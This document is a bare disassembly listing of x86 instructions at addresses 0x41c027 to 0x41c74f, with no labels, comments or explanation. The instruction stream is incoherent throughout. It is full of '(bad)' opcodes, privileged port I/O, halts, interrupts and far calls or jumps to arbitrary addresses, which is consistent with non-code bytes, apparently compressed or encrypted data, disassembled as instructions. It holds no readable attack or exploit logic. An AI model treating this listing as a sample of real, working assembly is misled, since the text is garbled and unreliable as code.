  41c027:	jmp    0x41c01d
  41c029:	mov    ebx,edi
  41c02b:	test   cl,ch
  41c02d:	dec    esi
  41c02e:	sbb    DWORD PTR [edi-0x6b],edx
  41c031:	and    ch,BYTE PTR [edx-0x39]
  41c034:	sbb    eax,0xdcc932c
  41c039:	cmp    bl,BYTE PTR [edx]
  41c03b:	xor    DWORD PTR [eax+0x34c23b01],edi
  41c041:	adc    al,0x51
  41c043:	push   esp
  41c044:	jne    0x41c05f
  41c046:	out    0x49,eax
  41c048:	mov    ebp,DWORD PTR [ebp+0x35]
  41c04b:	cmp    eax,0xc18f3886
  41c050:	cwde   
  41c051:	pop    ecx
  41c052:	push   edx
  41c053:	adc    eax,0x3cb51511
  41c058:	xchg   BYTE PTR [ecx+ecx*2-0xb48d236],dh
  41c05f:	sub    DWORD PTR [edx+esi*1-0x27],0x160c0e5f
  41c067:	repnz xor DWORD PTR [edi],0x25
  41c06b:	xchg   edx,eax
  41c06c:	dec    ebp
  41c06d:	ins    BYTE PTR es:[edi],dx
  41c06e:	sub    ebp,esp
  41c070:	cmp    BYTE PTR [ebx-0x436fdc53],bh
  41c076:	xor    edi,ebp
  41c078:	and    edx,edi
  41c07a:	sbb    eax,DWORD PTR [edi+0x42]
  41c07d:	imul   edx,DWORD PTR [edx+0x1a7c765d],0xffffff9b
  41c084:	jge    0x41c02f
  41c086:	ret    0x2b1e
  41c089:	jg     0x41c034
  41c08b:	fst    QWORD PTR [ebx-0x59f6d110]
  41c091:	pop    ebx
  41c092:	sub    BYTE PTR [ecx+0x1d161ba1],dl
  41c098:	lods   al,BYTE PTR ds:[esi]
  41c099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c09a:	sbb    BYTE PTR [ecx+0x45],0xc7
  41c09e:	(bad)  
  41c0a0:	cmp    edi,DWORD PTR [eax+0x2b]
  41c0a3:	das    
  41c0a4:	dec    di
  41c0a6:	pusha  
  41c0a7:	les    ebp,FWORD PTR [ebx-0x57]
  41c0aa:	(bad)  
  41c0ab:	aam    0x9
  41c0ad:	test   BYTE PTR [edi-0x54578b97],ah
  41c0b3:	not    bl
  41c0b5:	xchg   ebx,eax
  41c0b6:	int    0xa5
  41c0b8:	pop    ebp
  41c0b9:	adc    DWORD PTR [eax+0x61],ebp
  41c0bc:	lods   al,BYTE PTR ds:[esi]
  41c0bd:	imul   edx,DWORD PTR [esi],0x7490db9a
  41c0c3:	stc    
  41c0c4:	dec    esi
  41c0c5:	mov    dh,0xe3
  41c0c7:	mov    cl,0x2e
  41c0c9:	dec    esi
  41c0ca:	ja     0x41c10d
  41c0cc:	and    ecx,DWORD PTR [ecx-0x3b28762]
  41c0d2:	push   ebx
  41c0d3:	outs   dx,BYTE PTR ds:[esi]
  41c0d4:	or     al,0x62
  41c0d6:	repnz clc 
  41c0d8:	into   
  41c0d9:	jge    0x41c124
  41c0db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0dc:	jmp    0x41c110
  41c0de:	sbb    DWORD PTR [eax+edx*1-0x523ec3a7],edx
  41c0e5:	pushf  
  41c0e6:	push   edi
  41c0e7:	arpl   WORD PTR [esi],ax
  41c0e9:	xor    BYTE PTR [edx],ah
  41c0eb:	and    edx,DWORD PTR [ebp+0x2f1ee0fc]
  41c0f1:	lods   al,BYTE PTR ds:[esi]
  41c0f2:	jmp    0x41c119
  41c0f4:	mul    BYTE PTR [ebx+0x7e127843]
  41c0fa:	imul   eax,DWORD PTR [ecx+0x57ce7654],0x60
  41c101:	lods   al,BYTE PTR ds:[esi]
  41c102:	dec    ebp
  41c103:	xor    BYTE PTR [esi-0x55],cl
  41c106:	xor    DWORD PTR [eax-0x36],ebp
  41c109:	out    dx,eax
  41c10a:	add    BYTE PTR [eax+0x7d],dl
  41c10d:	and    DWORD PTR [edx],eax
  41c10f:	test   al,0xb7
  41c111:	dec    ecx
  41c112:	pop    edx
  41c113:	mov    eax,ds:0xd4e8c8b3
  41c118:	adc    BYTE PTR [edx+0x35d9ec04],ch
  41c11e:	fnstcw WORD PTR [ecx]
  41c120:	cwde   
  41c121:	push   0xffffffe9
  41c123:	(bad)  
  41c124:	xor    eax,DWORD PTR [ecx-0x2b]
  41c127:	cwde   
  41c128:	out    0xb0,eax
  41c12a:	fdivr  QWORD PTR [ebx-0x21a32f9]
  41c130:	pop    ebx
  41c131:	sbb    BYTE PTR [edi+0x2ba7edf9],cl
  41c137:	xor    BYTE PTR [edx],bh
  41c139:	mov    bh,0xb5
  41c13c:	xchg   esp,eax
  41c13d:	jge    0x41c0c6
  41c13f:	pushf  
  41c140:	mov    dh,0x4f
  41c142:	adc    DWORD PTR [esi],eax
  41c144:	scas   al,BYTE PTR es:[edi]
  41c145:	push   0xffffffff
  41c147:	fcmovb st,st(2)
  41c149:	mov    bl,0xc2
  41c14b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c14c:	xchg   esp,eax
  41c14d:	and    DWORD PTR [esi+eax*4],ebx
  41c150:	adc    esi,esp
  41c152:	xchg   edx,eax
  41c153:	adc    cl,bh
  41c155:	popa   
  41c156:	inc    esi
  41c157:	ss jmp 0x41c146
  41c15a:	shl    BYTE PTR [eax-0x7c],1
  41c15d:	jecxz  0x41c1c0
  41c15f:	sub    ah,0x34
  41c162:	daa    
  41c163:	pop    ebx
  41c164:	shr    BYTE PTR [eax],1
  41c166:	dec    ebx
  41c167:	es fdiv st,st(5)
  41c16a:	add    eax,0xe20b1e34
  41c16f:	idiv   DWORD PTR [eax+0x40eec798]
  41c175:	popa   
  41c176:	xchg   ebp,eax
  41c177:	sub    al,0xed
  41c179:	scas   al,BYTE PTR es:[edi]
  41c17a:	pop    ecx
  41c17b:	push   esp
  41c17c:	iret   
  41c17d:	shl    BYTE PTR [eax+0x49f59f82],cl
  41c183:	sub    al,0xbf
  41c185:	pop    edx
  41c186:	inc    edx
  41c187:	popf   
  41c188:	dec    edi
  41c189:	fs dec esi
  41c18b:	sub    BYTE PTR [edi+0xcc28fad],0xa9
  41c192:	jnp    0x41c116
  41c194:	or     eax,0x96d17cce
  41c199:	gs test eax,0x6906cb9f
  41c19f:	sub    esi,DWORD PTR [ebp-0x6bfdccff]
  41c1a5:	scas   al,BYTE PTR es:[edi]
  41c1a6:	mov    bh,0x66
  41c1a8:	mov    al,ds:0x37f75a90
  41c1ad:	fdivr  QWORD PTR [ebx+0x1a]
  41c1b0:	ins    DWORD PTR es:[edi],dx
  41c1b1:	mov    al,0x9b
  41c1b3:	dec    ebx
  41c1b4:	aas    
  41c1b5:	cmp    ch,BYTE PTR [ecx+0x21fa5965]
  41c1bb:	adc    edx,DWORD PTR [ebp+0x9]
  41c1be:	xchg   edi,ebp
  41c1c0:	dec    ebp
  41c1c1:	inc    ebp
  41c1c2:	xor    ebx,0x55
  41c1c5:	jmp    0x41c1a6
  41c1c7:	xchg   ecx,eax
  41c1c8:	pop    ebx
  41c1c9:	mov    BYTE PTR [edx+0x22],cl
  41c1cc:	data16 adc dl,0xc9
  41c1d0:	in     al,0x2d
  41c1d2:	hlt    
  41c1d3:	or     BYTE PTR [ebx+0x36dd03c],0xc8
  41c1da:	xchg   esi,eax
  41c1db:	push   esi
  41c1dc:	loopne 0x41c202
  41c1de:	ins    DWORD PTR es:[edi],dx
  41c1df:	fdivr  DWORD PTR [eax+eiz*4]
  41c1e2:	sbb    al,0x77
  41c1e4:	sub    edx,ecx
  41c1e6:	cwde   
  41c1e7:	xchg   ebx,eax
  41c1e8:	popa   
  41c1e9:	xchg   esp,eax
  41c1ea:	cld    
  41c1eb:	ret    0xd5ef
  41c1ee:	sub    eax,0xd0684ccb
  41c1f3:	add    esp,edx
  41c1f5:	aad    0x54
  41c1f7:	xor    edx,ecx
  41c1f9:	add    ecx,ecx
  41c1fb:	call   0xce4a209b
  41c200:	nop
  41c201:	mov    ecx,0x4e49e021
  41c206:	and    DWORD PTR [ecx],esi
  41c208:	push   ebx
  41c209:	cld    
  41c20a:	mov    esp,0x23073177
  41c20f:	fisttp WORD PTR [ebp+edx*4-0xc]
  41c213:	pushf  
  41c214:	xchg   ecx,eax
  41c215:	in     eax,dx
  41c216:	retf   
  41c217:	push   esp
  41c218:	rcl    ecx,1
  41c21a:	cdq    
  41c21b:	jae    0x41c1af
  41c21d:	xor    DWORD PTR ds:0xb2ba1c64,eax
  41c223:	push   edx
  41c224:	das    
  41c225:	dec    edi
  41c226:	imul   ebp,eax,0x3c
  41c229:	popa   
  41c22a:	push   edx
  41c22b:	fmulp  st(2),st
  41c22d:	nop
  41c22e:	rcl    BYTE PTR ds:0x9103a202,cl
  41c234:	pop    esp
  41c235:	hlt    
  41c236:	mov    BYTE PTR [ecx],ah
  41c238:	lods   eax,DWORD PTR ds:[esi]
  41c239:	sar    BYTE PTR [ebp-0x65],cl
  41c23c:	adc    ch,BYTE PTR [esi+0x54]
  41c23f:	sub    DWORD PTR [esi+0x68],edx
  41c242:	and    eax,0xb5252a44
  41c247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c248:	fcomp  QWORD PTR [edi+0x41]
  41c24b:	(bad)  
  41c24c:	jnp    0x41c224
  41c24e:	pop    ss
  41c24f:	mov    al,BYTE PTR [eax]
  41c251:	sub    DWORD PTR [edi],ecx
  41c253:	xchg   edi,eax
  41c254:	lock lahf 
  41c256:	daa    
  41c257:	mov    ds:0x8f25d482,al
  41c25c:	jo     0x41c22f
  41c25e:	xchg   ebp,eax
  41c25f:	sti    
  41c260:	retf   0x8c0e
  41c263:	dec    esi
  41c264:	mov    esi,esi
  41c266:	cmp    al,0x47
  41c268:	xchg   esi,eax
  41c269:	clc    
  41c26a:	call   0x46d8:0x5325aee8
  41c271:	push   0xffffff89
  41c273:	jnp    0x41c2b6
  41c275:	outs   dx,DWORD PTR es:[esi]
  41c277:	outs   dx,BYTE PTR ds:[esi]
  41c278:	stos   BYTE PTR es:[edi],al
  41c279:	rcl    BYTE PTR [ebp+ebp*4-0x4a],1
  41c27d:	xchg   edi,eax
  41c27e:	add    ecx,edx
  41c280:	dec    eax
  41c281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c282:	mov    ah,0x67
  41c284:	jp     0x41c22b
  41c286:	adc    eax,0xcac5e647
  41c28b:	shl    DWORD PTR [ecx+esi*2-0x38b56ae5],0x12
  41c293:	imul   edx,DWORD PTR [ebx],0xffffff9a
  41c296:	add    esp,ebp
  41c298:	test   DWORD PTR [ebp-0x32fbf55b],ecx
  41c29e:	mov    ds:0x626d5c8d,eax
  41c2a3:	xchg   edi,eax
  41c2a4:	or     eax,0x16adcbc7
  41c2a9:	or     ch,BYTE PTR [ebx-0x1c]
  41c2ac:	jle    0x41c267
  41c2ae:	or     DWORD PTR [eax],eax
  41c2b0:	pop    ds
  41c2b1:	xor    al,BYTE PTR [edi+0xfba95ab]
  41c2b7:	xchg   edi,eax
  41c2b8:	mov    edi,0xfdaf71ea
  41c2bd:	outs   dx,DWORD PTR ds:[esi]
  41c2be:	es out dx,al
  41c2c0:	lods   al,BYTE PTR ds:[esi]
  41c2c1:	add    edi,0xffffff9f
  41c2c4:	push   eax
  41c2c5:	push   es
  41c2c6:	lds    ecx,FWORD PTR ds:0xbe399d03
  41c2cc:	push   ss
  41c2cd:	lods   al,BYTE PTR ds:[esi]
  41c2ce:	xchg   ecx,eax
  41c2cf:	xchg   BYTE PTR [esi-0x1380dbf7],bh
  41c2d5:	test   DWORD PTR [esi-0xa1bd623],esp
  41c2db:	mov    ds:0x61515d94,al
  41c2e0:	fld    DWORD PTR [ebx-0x6ce9f753]
  41c2e6:	fadd   QWORD PTR [esi-0x46]
  41c2e9:	std    
  41c2ea:	shl    esi,1
  41c2ec:	aaa    
  41c2ed:	sbb    al,BYTE PTR [edi+0x5d]
  41c2f0:	mov    bh,0xae
  41c2f2:	xchg   esi,eax
  41c2f3:	sub    DWORD PTR [ebp-0x11],esp
  41c2f6:	xchg   ebp,eax
  41c2f7:	and    esi,DWORD PTR [edi]
  41c2f9:	adc    dh,dh
  41c2fb:	pop    edi
  41c2fc:	into   
  41c2fd:	test   eax,0x6dacd3f3
  41c302:	shr    bl,cl
  41c304:	repz in eax,dx
  41c306:	mov    bl,cl
  41c308:	retf   0x6247
  41c30b:	(bad)  
  41c30c:	arpl   WORD PTR [ecx+ebp*1+0xc],di
  41c310:	fisttp DWORD PTR [edx]
  41c312:	inc    esp
  41c313:	xchg   ebx,eax
  41c314:	retf   
  41c315:	imul   BYTE PTR [esi-0x25fc4a94]
  41c31b:	dec    edx
  41c31c:	hlt    
  41c31d:	mov    ch,0x1d
  41c31f:	sub    eax,0x501bd18b
  41c324:	fs gs mov ebp,0x9c03fd28
  41c32b:	lods   al,BYTE PTR ds:[esi]
  41c32c:	div    DWORD PTR [ebx-0x1b]
  41c32f:	outs   dx,DWORD PTR ds:[esi]
  41c330:	xor    DWORD PTR [edi-0x4be5a2d9],edi
  41c336:	jno    0x41c2f1
  41c338:	inc    edx
  41c339:	push   ecx
  41c33a:	xchg   ebx,eax
  41c33b:	data16 int 0x31
  41c33e:	pop    es
  41c33f:	jns    0x41c2c9
  41c341:	lahf   
  41c342:	div    DWORD PTR [ecx-0x533b4c39]
  41c348:	int3   
  41c349:	into   
  41c34a:	jbe    0x41c3b0
  41c34c:	xchg   esi,eax
  41c34d:	test   al,0xc6
  41c34f:	sbb    bh,BYTE PTR [edx+0x1e6d00da]
  41c355:	into   
  41c356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c357:	sbb    BYTE PTR ds:0x26dcf64b,ch
  41c35d:	fisub  DWORD PTR [ecx]
  41c35f:	push   ebx
  41c360:	(bad)  
  41c362:	imul   ebp,DWORD PTR [edx-0x33],0x652f844e
  41c369:	ins    DWORD PTR es:[edi],dx
  41c36a:	pushf  
  41c36b:	mov    al,ds:0xd63e00f8
  41c370:	ret    
  41c371:	mov    BYTE PTR ds:0x8ece0dda,dl
  41c377:	or     al,0x96
  41c379:	lahf   
  41c37a:	fwait
  41c37b:	push   0x3089e418
  41c380:	jne    0x41c3d3
  41c382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c383:	xor    ch,ch
  41c385:	xchg   edx,eax
  41c386:	dec    ebp
  41c387:	sbb    bh,0x73
  41c38a:	leave  
  41c38b:	pop    ebp
  41c38c:	in     eax,0xd3
  41c38e:	sub    al,0xef
  41c390:	scas   al,BYTE PTR es:[edi]
  41c391:	pop    ecx
  41c392:	sti    
  41c393:	out    dx,al
  41c394:	add    al,0xc1
  41c396:	jle    0x41c3e6
  41c398:	add    eax,0xda427fd9
  41c39d:	sar    BYTE PTR [edx+0x2e279bd4],1
  41c3a3:	pushf  
  41c3a4:	pop    esp
  41c3a5:	pop    esi
  41c3a6:	fiadd  WORD PTR [ebx-0x68]
  41c3a9:	pop    es
  41c3aa:	sub    esp,DWORD PTR [ebp+0x56]
  41c3ad:	popf   
  41c3ae:	or     al,0xd2
  41c3b0:	sbb    al,0xa2
  41c3b2:	adc    edi,DWORD PTR [ecx+0x214624c]
  41c3b8:	fadd   QWORD PTR [ebx-0x5ac048b8]
  41c3be:	add    eax,0x21727e55
  41c3c3:	aas    
  41c3c4:	fwait
  41c3c5:	retf   0x22a3
  41c3c8:	sub    BYTE PTR [eax-0x7c7bae53],al
  41c3ce:	or     eax,0x9561a866
  41c3d3:	xchg   edi,eax
  41c3d4:	cs cmc 
  41c3d6:	cwde   
  41c3d7:	push   es
  41c3d8:	mov    eax,0x854c065a
  41c3dd:	jg     0x41c382
  41c3df:	test   DWORD PTR [edi+0x46],ecx
  41c3e2:	xchg   edi,eax
  41c3e3:	rcr    DWORD PTR [ebp+ebx*2-0x1430c71],1
  41c3ea:	pop    ecx
  41c3eb:	push   edi
  41c3ec:	call   0xa2cf:0x32b0bf9b
  41c3f3:	stc    
  41c3f4:	cmc    
  41c3f5:	retf   
  41c3f6:	shl    DWORD PTR [edi+ebx*4],0x9e
  41c3fa:	out    dx,eax
  41c3fb:	jmp    0x80cd2e16
  41c400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c401:	mov    edi,0xed92306e
  41c406:	loop   0x41c446
  41c408:	inc    esp
  41c409:	in     eax,dx
  41c40a:	jne    0x41c3ca
  41c40c:	xchg   ecx,eax
  41c40d:	mov    eax,0xd29a2364
  41c412:	shufps xmm1,xmm2,0x9b
  41c416:	cmp    eax,0xc2b85f3b
  41c41b:	int    0x1a
  41c41d:	mov    ds:0x6b3545c5,eax
  41c422:	call   0x8e4d:0xcc4d0935
  41c429:	lea    ecx,[edi+0x63]
  41c42c:	loopne 0x41c3dd
  41c42e:	adc    DWORD PTR [ebp-0x2a79e5a1],edi
  41c434:	cmc    
  41c435:	pop    eax
  41c436:	(bad)  
  41c438:	(bad)  
  41c439:	imul   eax,edi,0x6
  41c43c:	mov    dh,0x16
  41c43e:	xchg   edi,eax
  41c43f:	pop    es
  41c440:	cwde   
  41c441:	cmp    al,0xa7
  41c443:	iret   
  41c444:	sti    
  41c445:	xor    BYTE PTR [ecx],0x33
  41c448:	sub    cl,BYTE PTR [edi+0x18]
  41c44b:	xor    al,0x23
  41c44e:	loop   0x41c4b9
  41c450:	mov    ebp,0xc3476c8c
  41c455:	lods   eax,DWORD PTR ds:[esi]
  41c456:	or     eax,0x7b484037
  41c45b:	pop    edx
  41c45c:	dec    eax
  41c45d:	mov    ds:0x2601c575,al
  41c462:	xor    DWORD PTR [eax+0x1e],esp
  41c465:	(bad)  
  41c466:	jle    0x41c427
  41c468:	test   al,0x36
  41c46a:	push   ds
  41c46b:	xor    BYTE PTR [edx+0x632ce491],bl
  41c471:	inc    ecx
  41c472:	cli    
  41c473:	(bad)  
  41c474:	mov    bh,0x58
  41c476:	xlat   BYTE PTR ds:[ebx]
  41c477:	adc    eax,0x9e32a381
  41c47c:	or     bh,BYTE PTR [ebx]
  41c47e:	dec    ebx
  41c47f:	inc    BYTE PTR [edi]
  41c481:	or     dh,BYTE PTR [eax]
  41c483:	and    DWORD PTR [ebp-0x714635b],esp
  41c489:	mov    ecx,0x8c84928b
  41c48e:	sub    eax,ecx
  41c490:	imul   ebx,DWORD PTR [ebp-0x69],0x1a
  41c494:	fcomi  st,st(4)
  41c496:	aam    0x8e
  41c498:	xchg   ebx,eax
  41c499:	clc    
  41c49a:	fcomp  QWORD PTR [ebx-0x48]
  41c49d:	cld    
  41c49e:	add    al,dl
  41c4a0:	cld    
  41c4a1:	das    
  41c4a2:	jge    0x41c445
  41c4a4:	lahf   
  41c4a5:	callw  0xa417
  41c4a9:	sub    eax,0x3b15db04
  41c4ae:	sbb    ebx,DWORD PTR [ebx-0x6e]
  41c4b1:	mov    es,WORD PTR [esp+esi*8-0x42]
  41c4b5:	adc    DWORD PTR [ecx+0x18],esi
  41c4b8:	fdiv   DWORD PTR [ecx]
  41c4ba:	mov    bl,0xc7
  41c4bc:	push   ds
  41c4bd:	mov    edx,0x71d51ef9
  41c4c2:	aam    0x4e
  41c4c4:	sti    
  41c4c5:	inc    edx
  41c4c6:	add    BYTE PTR [edx-0x32437566],dh
  41c4cc:	cld    
  41c4cd:	inc    BYTE PTR [ebx-0x41]
  41c4d0:	stc    
  41c4d1:	mov    al,ds:0x698c3cff
  41c4d6:	clc    
  41c4d7:	cmp    bh,bh
  41c4d9:	jnp    0x41c554
  41c4db:	xchg   esi,eax
  41c4dc:	(bad)  
  41c4dd:	out    dx,al
  41c4de:	fsub   DWORD PTR [edi]
  41c4e0:	cmp    DWORD PTR [eax+ebp*4-0x449b4a16],edx
  41c4e7:	out    0xd9,eax
  41c4e9:	mov    ecx,0x9ed2e243
  41c4ee:	outs   dx,BYTE PTR es:[esi]
  41c4f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4f1:	push   edx
  41c4f2:	mov    eax,edi
  41c4f4:	mov    ch,0x43
  41c4f6:	and    DWORD PTR [ecx],0x96c47435
  41c4fc:	inc    ebp
  41c4fd:	inc    eax
  41c4fe:	jno    0x41c57a
  41c500:	cmp    ch,BYTE PTR ds:0x328b7e50
  41c506:	push   esi
  41c507:	outs   dx,DWORD PTR ds:[esi]
  41c508:	xor    ebx,DWORD PTR [ebp-0x74]
  41c50b:	mov    ds:0x9faecf3c,eax
  41c510:	or     BYTE PTR [edx+0xcbb7964],ch
  41c516:	fwait
  41c517:	(bad)  
  41c518:	pop    esp
  41c519:	dec    edx
  41c51a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41c51c:	mov    ds:0x101331aa,eax
  41c521:	test   eax,0xb8dcb08
  41c526:	mov    DWORD PTR [edx],eax
  41c528:	cmp    BYTE PTR [ecx+0x5d],bh
  41c52b:	mov    esi,DWORD PTR [ebp+0x1c]
  41c52e:	bound  esp,QWORD PTR [esi+0x51]
  41c531:	outs   dx,BYTE PTR ds:[esi]
  41c532:	mov    al,0x5c
  41c534:	sbb    DWORD PTR [ebp+0x40e70c1d],0x15
  41c53b:	xor    ebp,DWORD PTR [ebx+eax*2]
  41c53e:	pop    esi
  41c53f:	add    edx,edx
  41c541:	inc    edx
  41c542:	arpl   ax,ax
  41c544:	icebp  
  41c545:	out    0x1f,eax
  41c547:	daa    
  41c548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c549:	or     DWORD PTR [edx],edi
  41c54b:	mov    al,ds:0xab834bb
  41c550:	dec    ebx
  41c551:	fadd   QWORD PTR [ebp+0x4f7d2f9d]
  41c557:	(bad)  
  41c558:	iret   
  41c559:	cmp    DWORD PTR [edi+0xfa4d789],edi
  41c55f:	cmp    DWORD PTR [ebp+0x6],0x36
  41c563:	mov    eax,ds:0xedc6af4e
  41c568:	mov    al,0xa6
  41c56a:	mov    cl,0xcb
  41c56c:	jno    0x41c548
  41c56e:	dec    ecx
  41c56f:	ins    DWORD PTR es:[edi],dx
  41c570:	imul   esi,DWORD PTR [esi],0xffffffee
  41c573:	fidiv  DWORD PTR [ebx]
  41c575:	sbb    BYTE PTR [edi+0x8],bh
  41c578:	or     DWORD PTR [edi-0x7d],esi
  41c57b:	int3   
  41c57c:	jg     0x41c597
  41c57e:	adc    dl,bh
  41c580:	call   0x17b6b6d6
  41c585:	imul   edx,esi,0x6d
  41c588:	push   ds
  41c589:	mov    bl,0x71
  41c58b:	and    cl,ah
  41c58d:	mov    ds:0xf0413a3b,al
  41c592:	imul   ebp,DWORD PTR [esi+eax*8-0x37],0xfdfbfb37
  41c59a:	fcomp  st(1)
  41c59c:	jecxz  0x41c5e7
  41c59e:	retf   0x50e1
  41c5a1:	aaa    
  41c5a2:	stos   DWORD PTR es:[edi],eax
  41c5a3:	imul   esi,DWORD PTR [eax+0x29136d52],0x345bf3a9
  41c5ad:	mov    ds:0x2ca7aa61,al
  41c5b2:	dec    ebp
  41c5b3:	cmp    BYTE PTR [edi+0x44],al
  41c5b6:	push   esp
  41c5b7:	std    
  41c5b8:	stos   DWORD PTR es:[edi],eax
  41c5b9:	xor    cl,BYTE PTR [ebp+0x40bbb912]
  41c5bf:	or     edi,DWORD PTR [ebp-0x43]
  41c5c2:	xor    ch,0x29
  41c5c5:	daa    
  41c5c6:	sbb    edi,DWORD PTR [ebp+ebx*8-0x61]
  41c5ca:	fsubr  QWORD PTR [edi+0xc]
  41c5cd:	pop    ebx
  41c5ce:	leave  
  41c5cf:	mov    es,ecx
  41c5d1:	inc    edx
  41c5d2:	(bad)  
  41c5d3:	mov    eax,ds:0xecfd427e
  41c5d8:	adc    dh,dl
  41c5da:	or     eax,0xee162298
  41c5df:	loop   0x41c593
  41c5e1:	jno    0x41c5bf
  41c5e3:	mov    eax,0x44b6ccb8
  41c5e8:	es inc esp
  41c5ea:	test   BYTE PTR [edx],0xa0
  41c5ed:	mov    cs,WORD PTR [ebx]
  41c5ef:	pop    es
  41c5f0:	adc    eax,0x2f0b154f
  41c5f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5f6:	ja     0x41c5a8
  41c5f8:	jb     0x41c5d4
  41c5fa:	int    0x59
  41c5fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5fd:	loopne 0x41c5b0
  41c5ff:	or     dl,cl
  41c601:	sbb    DWORD PTR cs:[ecx+esi*2-0xc282cc2],ebx
  41c609:	xor    BYTE PTR [edx+0x6],ch
  41c60c:	inc    edi
  41c60d:	popf   
  41c60e:	ds sahf 
  41c610:	jmp    0x41c5ce
  41c612:	retf   
  41c613:	mov    ecx,eax
  41c615:	movd   mm1,esp
  41c618:	std    
  41c619:	enter  0xfe9b,0x30
  41c61d:	xchg   ebx,eax
  41c61e:	jne    0x41c5f2
  41c620:	fdiv   st,st(3)
  41c622:	arpl   WORD PTR [eax],bp
  41c624:	dec    ebx
  41c625:	mov    ds:0x974c0234,al
  41c62a:	loopne 0x41c671
  41c62c:	pop    ecx
  41c62d:	outs   dx,DWORD PTR ds:[esi]
  41c62e:	add    al,0xce
  41c630:	loop   0x41c678
  41c632:	jle    0x41c698
  41c634:	in     al,dx
  41c635:	xchg   ecx,eax
  41c636:	xor    DWORD PTR [ebp+0x50],edx
  41c639:	in     al,0x97
  41c63b:	xor    BYTE PTR [eax-0x63],cl
  41c63e:	mov    dl,cl
  41c640:	and    BYTE PTR [ebx],bl
  41c642:	inc    ecx
  41c643:	xadd   bh,ah
  41c646:	lahf   
  41c647:	les    esi,FWORD PTR [eax-0xb]
  41c64a:	jnp    0x41c605
  41c64c:	or     eax,0xb97b50e8
  41c651:	or     BYTE PTR [ecx-0x5b],0xce
  41c655:	lods   al,BYTE PTR ds:[esi]
  41c656:	das    
  41c657:	adc    ebp,DWORD PTR [edx+0x7d]
  41c65a:	fisub  DWORD PTR [ecx]
  41c65c:	loopne 0x41c682
  41c65e:	jno    0x41c64e
  41c660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c661:	inc    eax
  41c662:	xchg   esi,eax
  41c663:	sbb    esp,0x72
  41c666:	imul   ebx,DWORD PTR [ecx+0x57],0x18
  41c66a:	jae    0x41c641
  41c66c:	cmp    al,0x9b
  41c66e:	mov    esp,0x86323134
  41c673:	(bad)
  41c677:	stc    
  41c678:	scas   al,BYTE PTR es:[edi]
  41c679:	pop    edi
  41c67a:	bound  esi,QWORD PTR [esi]
  41c67c:	in     eax,0xde
  41c67e:	xchg   BYTE PTR [ebp+0x68689354],dl
  41c684:	jge    0x41c619
  41c686:	sbb    ecx,DWORD PTR [eax+0xa1481b1]
  41c68c:	sahf   
  41c68d:	and    BYTE PTR [edi+0x70054a58],dl
  41c693:	pop    ds
  41c694:	adc    DWORD PTR [ecx+0x11],esp
  41c697:	pop    ss
  41c698:	mov    ebp,0xb58b4a81
  41c69d:	add    ch,dh
  41c69f:	or     BYTE PTR [ecx],bl
  41c6a1:	sub    edx,DWORD PTR [ecx-0x31]
  41c6a4:	push   0x41
  41c6a6:	jo     0x41c700
  41c6a8:	inc    ebx
  41c6a9:	sbb    ebx,esp
  41c6ab:	mov    BYTE PTR [ebp+0x60],ch
  41c6ae:	pop    edi
  41c6af:	loope  0x41c6e3
  41c6b1:	xchg   edi,eax
  41c6b2:	scas   al,BYTE PTR es:[edi]
  41c6b3:	bound  esi,QWORD PTR [esi]
  41c6b5:	cld    
  41c6b6:	ja     0x41c67d
  41c6b8:	sbb    BYTE PTR [ebx+0x73c39692],ch
  41c6be:	ret    0x8cc3
  41c6c1:	xchg   esp,eax
  41c6c2:	pop    edi
  41c6c3:	adc    BYTE PTR [ebx+0x3df61bba],0xba
  41c6ca:	push   cs
  41c6cb:	dec    eax
  41c6cc:	inc    ebx
  41c6cd:	in     al,0xde
  41c6cf:	in     eax,0x76
  41c6d1:	xor    esi,DWORD PTR [ecx]
  41c6d3:	test   al,0x71
  41c6d5:	retf   
  41c6d6:	mov    ch,0xf7
  41c6d8:	jbe    0x41c6ab
  41c6da:	xlat   BYTE PTR ds:[ebx]
  41c6db:	and    ch,bh
  41c6dd:	retf   
  41c6de:	mov    DWORD PTR [edi+0x319a619c],0xc5832b4a
  41c6e8:	inc    edi
  41c6e9:	bnd jns 0x41c6de
  41c6ec:	call   0x8874:0xeee10bd0
  41c6f3:	scas   eax,DWORD PTR es:[edi]
  41c6f4:	push   cs
  41c6f5:	fld    st(6)
  41c6f7:	stos   BYTE PTR es:[edi],al
  41c6f8:	xor    al,0x99
  41c6fa:	rcl    cl,cl
  41c6fc:	das    
  41c6fd:	repz add DWORD PTR [edi-0x1b],edi
  41c701:	out    0xa4,al
  41c703:	push   es
  41c704:	dec    ecx
  41c705:	sbb    eax,0x48bb2744
  41c70a:	dec    edi
  41c70b:	mov    edi,0x4a6514b1
  41c710:	cdq    
  41c711:	hlt    
  41c712:	cdq    
  41c713:	and    DWORD PTR [edx+0x75],0x71432739
  41c71a:	addr16 or al,0x4d
  41c71d:	mov    esi,0xfedb9712
  41c722:	or     al,BYTE PTR [esi-0x75]
  41c725:	xlat   BYTE PTR ds:[ebx]
  41c726:	adc    ebx,DWORD PTR [eax+0x6fe5ea4f]
  41c72c:	rcl    ebx,cl
  41c72e:	lock mov edx,0xed4b23ad
  41c734:	stc    
  41c735:	add    bl,BYTE PTR [edx]
  41c737:	loope  0x41c7aa
  41c739:	popf   
  41c73a:	jge    0x41c764
  41c73c:	test   esi,ecx
  41c73e:	in     al,dx
  41c73f:	mov    WORD PTR [edx],ss
  41c741:	ss nop
  41c743:	les    eax,FWORD PTR [edx-0x6c]
  41c746:	or     DWORD PTR [ebx-0x4e46f128],ebx
  41c74c:	popf   
  41c74d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c74e:	outs   dx,BYTE PTR ds:[esi]
  41c74f:	jp     0x41c778
